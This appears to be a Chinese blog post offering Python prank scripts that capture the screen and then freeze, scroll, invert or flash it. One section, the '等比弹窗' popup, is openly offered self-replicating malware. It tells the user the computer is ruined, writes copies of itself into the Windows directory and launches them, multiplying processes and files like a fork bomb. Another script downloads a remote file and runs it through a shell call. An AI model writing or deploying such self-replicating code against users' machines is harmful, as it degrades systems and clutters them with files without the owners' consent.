> [我的仓库](https://pandaoxi.coding.net/public/pandaoxi/PanDaoxi/git/files)，需要的文件可以下载。
> ![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/c3968d82fc984a59b2feb8828fa639ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)
> [点这儿。](https://pandaoxi.coding.net/p/pandaoxi/d/PanDaoxi/git/raw/master/%E5%8E%86%E5%8F%B2%E9%A1%B9%E7%9B%AE/Python%E7%A8%8B%E5%BA%8F%E7%89%B9%E6%95%88.zip?download=true)


@[TOC]

# 屏幕重影
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/d8f519fea6704333949f644ee6df1415.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)

```python
import pygame
from pygame.locals import *
from pyautogui import screenshot

pygame.init()
canvas = pygame.display.set_mode((800,800))
pygame.display.set_caption('Sshot')
canvas.fill((255,255,255))
screenshot(region = (0,0,800,800)).save('sshot.png')
i = pygame.image.load('sshot.png')
canvas.blit(i,(0,0))

def h():
    for event in pygame.event.get():
        if event.type==KEYDOWN and event.key==K_ESCAPE:
            pygame.quit()
            exit()

while True:
    canvas.blit(i,(0,0))
    screenshot(region = (0,0,800,800)).save('sshot.png')
    i = pygame.image.load('sshot.png')
    h()
    pygame.display.update()
```

# 屏幕移动
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/38afa2788f454d9aac1d89336e88b42c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)

```python
import pygame
from pygame.locals import *
from pyautogui import screenshot
from random import randint

def f():
    global bg
    screenshot(region = (0,0,1920,1080)).save('sshot.png')
    bg = pygame.image.load('sshot.png')

f()
pygame.init()
canvas = pygame.display.set_mode((1920,1080))
canvas.fill((255,255,255))
pygame.display.set_caption('MOVE')

def h():
    for event in pygame.event.get():
        if event.type == KEYDOWN and event.key == K_ESCAPE:
            pygame.quit()
            exit()

x1 = 0
y1 = 0
height = 1080
x2 = 0
y2 = -height

x3 = 0
y3 = 0
width = 1920
x4 = 0
y4 = 0
n = randint(0,1)
while True:
    if n:
        canvas.blit(bg,(x1,y1))
        y1 += 3
        canvas.blit(bg,(x2,y2))
        y2 += 3
        if y1 > height:
            y1 = -height
        if y2 > height:
            y2 = -height
    else:
        canvas.blit(bg,(x3,y3))
        x3 += 3
        canvas.blit(bg,(x4,y4))
        x4 += 3
        if x3 > width:
            x3 = -width
        if x4 > width:
            x4 = -width
    h()
    pygame.display.update()
```

# 随机音乐

```python
from random import choice
from requests import get
from os import system

# range(ord('a'),ord('t') + 1)
fl = []
for i in range(97,117):
    fl.append('https://pandaoxi.coding.net/p/pandaoxi/d/PanDaoxi/git/raw/master/%E9%9F%B3%E4%B9%90%E8%B5%84%E6%BA%90/{}.mp3?download=true'.format(chr(i)))
f = choice(fl)
print(f)
with open('music.mp3','wb') as w:
    w.write(get(f).content)

system('call music.mp3')
```
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/537b2dc70e0447ad92fbfb527f346c48.png)

# 等比弹窗
以前做过，不演示了

```python
from tkinter import Tk,Label
from random import randint
from os import system,name,environ
from time import sleep

title = "Message"
message = "很不好意思，您的电脑废了"
loops = []
window = Tk()
window.geometry("350x50")
window.title(title)
path=environ["windir"]

def main():
    global loops,window
    Label(window,text=message,font=('Microsoft YaHei',20)).pack()
    sleep(5)
    with open(__file__,"r",encoding="utf-8") as f:
        text = f.read()
    for i in range(0,2):
        content = "%s\\%d.py" % (path,randint(100000,999999))
        with open(content,"w",encoding="utf-8") as f:
            f.write(text)
        loops.append(content)
    for i in range(0,2):
        system("start /min cmd /c python %s" % loops[i])

if __name__ == "__main__" and name == "nt":
    main()
else:
    showerror("Message","无法运行程序，原因可能是：\n①(1)您非主动运行程序。\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。")
    exit()
window.mainloop()

```

# 屏幕反色
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/58323ac8101d439094b84836ff225805.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)

```python
import cv2
import pygame
from pygame.locals import *
from pyautogui import screenshot
from random import randint
from time import sleep

screenshot(region = (0,0,1920,1080)).save('sshot.png')
im = pygame.image.load('sshot.png')
pygame.init()
canvas = pygame.display.set_mode((1920,1080))
pygame.display.set_caption('SCREEN')
for i in range(0,100): canvas.blit(im,(0,0))

def f():
    screenshot(region = (0,0,1920,1080)).save('sshots.png')
    img = cv2.imread('sshots.png', 1)
    img_shape = img.shape
    h = img_shape[0]
    w = img_shape[1]
    dst = 255 - img
    x = randint(100000,999999)
    cv2.imwrite("save%d.png" % x,dst,[cv2.IMWRITE_PNG_COMPRESSION,0])
    i = pygame.image.load("save%d.png" % x)
    canvas.blit(i,(0,0))
    cv2.waitKey(0)
    
def h():
    for event in pygame.event.get():
        if event.type == KEYDOWN and event.key == K_ESCAPE:
            pygame.quit()
            exit()

while True:
    f()
    h()
    pygame.display.update()
    pygame.time.delay(randint(500,3500))
```

# 屏幕闪烁
这个我也做过，不说了

```python
import pygame
from pygame.locals import *
from random import randint

pygame.init()
canvas = pygame.display.set_mode((1920,1080))
pygame.display.set_caption("Computer Dance")
canvas.fill((255,255,255))

def h():
    for event in pygame.event.get():
        if event.type==KEYDOWN and event.key==K_ESCAPE:
            pygame.quit()
            exit()
            
while True:
    r,g,b = randint(0,255),randint(0,255),randint(0,255)
    rgb = (r,g,b)
    canvas.fill(rgb)
    h()
    pygame.display.update()
```

# 屏幕失效

```python
import pygame
from pygame.locals import *
from pyautogui import screenshot

screenshot(region = (0,0,1920,1080)).save('sshot.png')
i = pygame.image.load("./sshot.png")
pygame.init()
canvas = pygame.display.set_mode((1920,1080))
pygame.display.set_caption('Sshot')
canvas.blit(i,(0,0))

def h():
    for event in pygame.event.get():
        if event.type==KEYDOWN and event.key==K_ESCAPE:
            pygame.quit()
            exit()

while True:
    canvas.blit(i,(0,0))
    screenshot(region = (0,0,1920,1080)).save('sshot.png')
    i = pygame.image.load('sshot.png')
    h()
    pygame.display.update()
```

